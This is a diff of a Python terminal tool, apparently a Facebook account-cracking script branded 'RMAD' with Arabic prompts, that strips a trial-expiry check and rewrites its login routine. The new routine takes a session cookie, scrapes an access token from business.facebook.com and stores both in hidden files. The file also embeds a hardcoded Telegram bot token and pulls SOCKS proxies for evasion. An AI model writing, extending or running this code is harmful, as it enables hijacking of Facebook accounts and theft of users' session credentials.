@@ -121,7 +121,7 @@ def r():
     RMAD(logo)
 r()
 import webbrowser
-webbrowser.open('')
+webbrowser.open('https://t.me/N_9_N_6')
 
 
 
@@ -164,9 +164,6 @@ def u():
     RMAD1(logo)
 u()
 print('\x1b[38;5;14m━━━━━━━━━━━━━━━━━━━━━━━⚜️ 𝑹𝑴𝑨𝑫 ⚜️━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-print('\x1b[0;34m تم انتهاء المدة المجانيه للاشتراك قم بل تواصل مع المطور @R_M_D ')
-
-exit()
 
 
 
@@ -376,9 +373,11 @@ b = '\33[1;96m' # BIRU -
 p = '\x1b[0;34m' # BIRU +
 asu = random.choice([m,k,h,u,b])
 #------------[ 𝑹𝑴𝑨𝑫]--------------#
-dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
+dic = {'1':'jan','2':'feb','3':'mar','4':'apr','5':'may','6':'jun','7':'jul','8':'aug','9':'sep','10':'oct','11':'nov','12':'dec'}
 soznop = '6103725322:AAETvAByJ5sXofTn2ACo46mYVYIB3w0xtFE'
-dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
+dic2 = {'1':'jan','2':'feb','3':'mar','4':'apr','5':'may','6':'jun','7':'jul','8':'aug','9':'sep','10':'oct','11':'nov','12':'dec'}
+ua = 'Mozilla/5.0 (Linux; Android 10; LIO-N29; HMSCore 6.4.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.1.302 Mobile Safari/537.3'
 tgl = datetime.datetime.now().day
 bln = dic[(str(datetime.datetime.now().month))]
 thn = datetime.datetime.now().year
@@ -470,7 +469,7 @@ class Login:
         except:pass
     def get_proxy(self):
         rest = []
-        self.ses.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36"})
+        self.ses.headers.update({"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36,Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:47.0) Gecko/20100101 Firefox/47.0,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36,Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36,Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36,Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0,Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.96 Safari/537.36,Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
         gots = par(self.ses.get("https://hidemy.name/en/proxy-list/?type=5").text, "html.parser")
         reg = re.findall(">(\d+.\d+.\d+.\d+).*?>(\d+).*?i", str(gots))
         for x in reg:
@@ -503,14 +502,18 @@ class Login:
         self.jnckk()
         os.system('clear')
         llogin()
-        def fak_xy(u):
-        	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
+        def xox(z):
+        	for e in z + '\n':
+        		sys.stdout.write(e)
+        		sys.stdout.flush()
+        		time.sleep(0.01)
         def clear():
         	os.system('clear')
         	def back():
         		llogin()
         	def banner():
         		print(f''' 𓃠 ''')
+        		os.system("clear")
         exit()        
         ykh = input(f"{H}[{M}+{H}]{N} HINI ")
         if ykh in ["", " "]:
@@ -769,146 +772,38 @@ def banner():
 def llogin():
 	try:
 		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
+		cok= open('.cok.txt','r').read()
 		tokenku.append(token)
 		try:
-			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
+			sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0], cookies = {"cookie":cok})
 			sy2 = json.loads(sy.text)['name']
 			sy3 = json.loads(sy.text)['id']
 			menu(sy2,sy3)
 		except KeyError:
 			login_lagi334()
 		except requests.exceptions.ConnectionError:
-			print('[!] ConnectionError')
+			banner()
+			print(' %s الكوكيز لا يعمل  ! '%(M))
 			exit()
 	except IOError:
 		login_lagi334()
+
+
 def login_lagi334():
+	banner()
 	try:
-		os.system('clear')
-		banner()
-		ses = requests.Session()
-		cok = input('\n اعد ادخال الكوكيز  : ')
-		ses.headers.update(
-			{
-				'content-type': 'application/x-www-form-urlencoded',
-			}
-		)
-		data = {
-				'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
-				'scope': ''
-		}
-		response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
-		code, user_code = response['code'], response['user_code']
-		verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
-		ses.headers.pop(
-			'content-type'
-		)
-		ses.headers.update(
-			{
-				'sec-fetch-mode': 'navigate',
-				'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
-				'sec-fetch-site': 'cross-site',
-				'Host': 'm.facebook.com',
-				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-				'sec-fetch-dest': 'document',
-			}
-		)
-		response2 = ses.get(verification_url, cookies = {'cookie': cok}).text
-		if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
-			exit('\n[!] كوكيز غير شغال ')
-		else:
-			action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
-			fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
-			jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
-			data = {
-				'fb_dtsg': fb_dtsg,
-				'jazoest': jazoest,
-				'qr': 0,
-				'user_code': user_code,
-			}
-			ses.headers.update(
-				{
-					'origin': 'https://m.facebook.com',
-					'referer': verification_url,
-					'content-type': 'application/x-www-form-urlencoded',
-					'sec-fetch-site': 'same-origin',
-				}
-			)
-			response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok})
-			if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
-				ses.headers.pop(
-					'content-type'
-				)
-				ses.headers.pop(
-					'origin'
-				)
-				response4 = ses.post(response3.url, data = data, cookies = {'cookie': cok}).text
-				action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
-				fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
-				jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
-				scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
-				display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
-				user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
-				logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
-				auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
-				encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
-				return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
-				ses.headers.update(
-					{
-						'origin': 'https://m.facebook.com',
-						'referer': response3.url,
-						'content-type': 'application/x-www-form-urlencoded',
-					}
-				)
-				data = {
-					'fb_dtsg': fb_dtsg,
-					'jazoest': jazoest,
-					'scope': scope,
-					'display': display,
-					'user_code': user_code,
-					'logger_id': logger_id,
-					'auth_type': auth_type,
-					'encrypted_post_body': encrypted_post_body,
-					'return_format[]': return_format,
-				}
-				response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok}).text
-				windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
-				ses.headers.pop(
-					'content-type'
-				)
-				ses.headers.pop(
-					'origin'
-				)
-				ses.headers.update(
-					{
-						'referer': 'https://m.facebook.com/',
-					}
-				)
-				response6 = ses.get(windows_referer, cookies = {'cookie': cok}).text
-				if 'Sukses!' in str(response6):
-					ses.headers.update(
-						{
-							'sec-fetch-mode': 'no-cors',
-							'referer': 'https://graph.facebook.com/',
-							'Host': 'graph.facebook.com',
-							'accept': '*/*',
-							'sec-fetch-dest': 'script',
-							'sec-fetch-site': 'cross-site',
-						}
-					)
-					response7 = ses.get(status_url, cookies = {'cookie': cok}).text
-					tok = re.search('"access_token": "(.*?)"', str(response7)).group(1)
-					tokenw = open(".token.txt", "w").write(tok)
-					cokiew = open(".cok.txt", "w").write(cok)
-					print(f'\n نجح تسجيل الدخول  ✓')
-				else:
-					exit('\n فشل تسجيل الدخول ')
+		cookie=input("%s \x1b[38;5;13m اعد ادخال الكوكيز  :  %s \x1b[38;5;91m  "%(K,H))
+		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.114 Safari/537.36,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36,Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0),Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:47.0) Gecko/20100101 Firefox/47.0,Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Safari/537.36,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36,Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
+		find_token = re.search("(EAAG\w+)", data.text)
+		ken=open(".token.txt", "w").write(find_token.group(1))
+		cok=open(".cok.txt", "w").write(cookie)
+		print('\x1b[1;94m')
+		print(f'\n نجح تسجيل الدخول  ✓')
 		
+		exit()
 	except Exception as e:
-		print('\n[!] Cookies Invalid Bro...X')
-		os.system('rm -rf .cok.txt && rm -rf .token.txt')
-		print(e)
+		os.system("rm -f .token.txt")
+		print('%s الكوكيز لا يعمل : '%(M))
 		exit()
 	except:pass
 
@@ -947,12 +842,12 @@ def menu(my_name,my_id):
 	print('  {\x1b[1;32m1\x1b[1;36m} \x1b[38;5;219m 𝕱𝕽𝕴𝕹𝕯𝕾   \x1b[38;5;23m   :  \x1b[38;5;209m من الاصدقاء     ')
 	print('')
 	print(f'''  {r9}✄  {r7}┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈	''')
-	
+	print('')	
 	print('  {\x1b[1;32m2\x1b[1;36m} \x1b[38;5;21m𝐅𝐑𝐎𝐌 𝐅𝐈l𝐄 \x1b[38;5;14m : \x1b[38;5;89m  من ملف : فقط في المدفوع متوفرة    ')
 	print('')
 	
 	print(f'''  {r9}✄  {r7}┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈	''')
-	
+	print('')
 
 	print('  {\x1b[1;32m0\x1b[1;36m} \x1b[38;5;196m𝐄𝐗𝐈𝐓       :   تسجيل خروج    ')
 	print('')
@@ -1575,7 +1470,7 @@ if __name__=='__main__':
 	try:os.system('pkg install play-audio')
 	except:pass
 	try:os.system('clear')
-	except:pass	
+	except:pass
 	Login()
 	
 	Threads=[] 
